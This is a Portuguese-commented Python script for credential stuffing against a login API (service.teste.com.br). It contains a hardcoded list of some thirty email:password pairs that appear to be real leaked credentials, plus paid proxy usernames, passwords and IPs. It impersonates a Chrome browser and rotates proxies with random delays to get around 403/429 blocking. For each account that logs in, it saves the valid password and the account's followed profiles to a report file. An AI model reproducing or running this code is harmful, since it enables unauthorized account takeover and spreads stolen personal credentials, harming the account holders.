from curl_cffi import requests
import time
import random
from datetime import datetime

LOGIN_API_URL = "https://service.teste.com.br/auth/login"
MODELOS_URL = "https://service.teste.com.br/profile/UserFollowing"

# ==================== CREDENCIAIS ====================
CREDENCIAIS_STRING = """
fujinippon1@gmail.com:@Asf124578
mikamisshate@gmail.com:Vip@2025
juniorandrade90@outlook.com:Vip@2025
barraganluisenbarnking@gmail.com:85323052Le@
Matheusdealsantos2@gmail.com:Agosto20.
girinog55@gmail.com:8137euJosue.
jodorowsky69@gmail.com:Nef@sDeus2077
Talitagomess1998@gmail.com:Talita.2020
biel.kazamee@gmail.com:Gelatina1#
sorocaba1998@hotmail.com:carroverde0E$
henriqueborges12@hotmail.com:240711He.
jmoraesmarciano@outlook.com:@Br125465
Brayanalveess@gmail.com:Bmrqss09#
paulinamontejo56@gmail.com:Acosmo122906.
Mateusmarqueslabre20@gmail.com:Labre135*
bizongames01@gmail.com:Eyjj3873#
renatofazendaserraazul@hotmail.com:Elisa020416.
Jeannvitorr6@gmail.com:Abacaxi2024@
genilsondelas145@gmail.com:@b_1bc2A
dedeh7089@gmail.com:A63482148a*
bolsoarthur22@gmail.com:342619aA*
gikipinheiro@hotmail.com:vNxd3Z@vQ76pdPJ
Lemesv580@gmail.com:BBolinha123@#
Junioferreira2917@gmail.com:Junio.1988
jorgebsilva1996@gmail.com:#Jorge25185678
Cogumelomalucoazul@gmail.com:Cogumelo123.
Rafaeljunior8951@gmail.com:Rafa04@R
robertdellafuria007@gmail.com:Xx21xx04$
kzalbbw1@gmail.com:Rogidias!@3
jtales52@gmail.com:Taoismo@123
aureliochaussetnc@gmail.com:Privacy@1234
elamktltda@gmail.com:142122jj.AAA
gustavoottoaugustodelima@gmail.com:#L8528v#
"""
# ====================================================

# ==================== PROXIES ====================
PROXY_USER = 'tgprmbdf'
PROXY_PASS = '161wfx8rjtkw'

PROXIES = [
    {"ip": "31.59.20.176", "port": "6754"},
    {"ip": "31.56.127.193", "port": "7684"},
    {"ip": "45.38.107.97", "port": "6014"},
    {"ip": "198.105.121.200", "port": "6462"},
    {"ip": "64.137.96.74", "port": "6641"},
    {"ip": "198.23.243.226", "port": "6361"},
    {"ip": "38.154.185.97", "port": "6370"},
    {"ip": "84.247.60.125", "port": "6095"},
    {"ip": "142.111.67.146", "port": "5611"},
    {"ip": "191.96.254.138", "port": "6185"},
]

def get_random_proxy():
    proxy = random.choice(PROXIES)
    proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{proxy['ip']}:{proxy['port']}"
    return {"http": proxy_url, "https": proxy_url}
# ====================================================

RELATORIO_ARQUIVO = "relatorio_modelos_ativos.txt"

def processar_credenciais(texto):
    credenciais = []
    for linha in texto.strip().split('\n'):
        linha = linha.strip()
        if ':' in linha:
            email, senha = linha.split(':', 1)
            credenciais.append((email.strip(), senha.strip()))
    return credenciais

def main():
    credenciais = processar_credenciais(CREDENCIAIS_STRING)

    with open(RELATORIO_ARQUIVO, "a", encoding="utf-8") as relatorio:
        relatorio.write(f"\n{'=' * 90}\n")
        relatorio.write(f"RELATÓRIO GERADO EM: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        relatorio.write(f"{'=' * 90}\n")

        for email, senha in credenciais:
            print(f"\n🔐 Testando: {email}")
            
            sucesso_conta = False
            max_tentativas = 3

            for tentativa in range(1, max_tentativas + 1):
                if sucesso_conta:
                    break

                meu_proxy = get_random_proxy()
                ip_display = meu_proxy['http'].split('@')[-1]
                print(f"🌐 [Tentativa {tentativa}/{max_tentativas}] Usando Proxy: {ip_display}")

                # CRIANDO A SESSÃO SEM O PROXY AQUI (Idêntico ao bot)
                session = requests.Session(impersonate="chrome120")

                payload = {
                    "Email": email,
                    "Password": senha,
                    "Document": None,
                    "Locale": "pt-BR",
                    "CanReceiveEmail": False
                }

                time.sleep(random.uniform(5.0, 10.0))

                try:
                    # PASSANDO O PROXY DIRETO NO POST (Idêntico ao bot)
                    login_resp = session.post(LOGIN_API_URL, json=payload, proxies=meu_proxy, timeout=20)

                    if login_resp.status_code in [403, 429]:
                        print(f"⚠️ Bloqueio {login_resp.status_code} detectado. Trocando de proxy...")
                        continue

                    elif login_resp.status_code == 200:
                        print("✅ Login OK!")
                        token = login_resp.json().get("token")
                        sucesso_conta = True

                        if token:
                            session.headers.update({"Authorization": f"Bearer {token}"})

                        time.sleep(random.uniform(2.0, 4.0))
                        
                        # PASSANDO O PROXY NO GET TAMBÉM
                        models_resp = session.get(MODELOS_URL, params={"page": 0, "limit": 100, "nickName": ""}, proxies=meu_proxy)

                        relatorio.write(f"\n{'-' * 70}\n")
                        relatorio.write(f"CONTA: {email}\n")
                        relatorio.write(f"SENHA: {senha}\n")

                        if models_resp.status_code == 200:
                            modelos = models_resp.json()
                            print(f"✅ {len(modelos)} modelos encontrados!")
                            relatorio.write(f"Total de modelos: {len(modelos)}\n\n")

                            if len(modelos) > 0:
                                print("\n🔍 [DEBUG] Estrutura crua do primeiro modelo:")
                                print(modelos[0])
                                print("-" * 40 + "\n")

                            for m in modelos:
                                is_free = m.get("isFree", m.get("IsFree"))
                                
                                if is_free is True or str(is_free).lower() == "true":
                                    status = "GRÁTIS"
                                else:
                                    status = "PAGO"
                                    
                                relatorio.write(f"• {m.get('nickName', 'SemNick')} ({m.get('profileName', 'SemPerfil')}) | {status}\n")

                        elif models_resp.status_code == 204:
                            print("ℹ️ Nenhum modelo encontrado")
                            relatorio.write(f"Total de modelos: 0\n")
                        else:
                            print(f"⚠️ Erro ao buscar modelos: {models_resp.status_code}")
                            relatorio.write(f"ERRO ao buscar modelos: {models_resp.status_code}\n")

                    elif login_resp.status_code in [400, 401]:
                        print(f"❌ Falha no login ({login_resp.status_code}) - Senha/Email incorretos.")
                        relatorio.write(f"\n{'-' * 70}\nCONTA: {email}\nSENHA: {senha}\nERRO: Falha no login ({login_resp.status_code})\n")
                        break

                    else:
                        print(f"❌ Erro inesperado ({login_resp.status_code}). Trocando proxy...")
                        continue

                except Exception as e:
                    erro_msg = str(e)
                    if "407" in erro_msg or "tunnel failed" in erro_msg:
                        print("⚠️ Falha de conexão com o Proxy (407). Trocando proxy...")
                    else:
                        print(f"❌ Erro de conexão/timeout. Trocando proxy...")
            
            if not sucesso_conta:
                print(f"🚨 A conta {email} falhou após {max_tentativas} tentativas.")

    print(f"\n✅ Relatório final salvo em: {RELATORIO_ARQUIVO}")

if __name__ == "__main__":
    main()
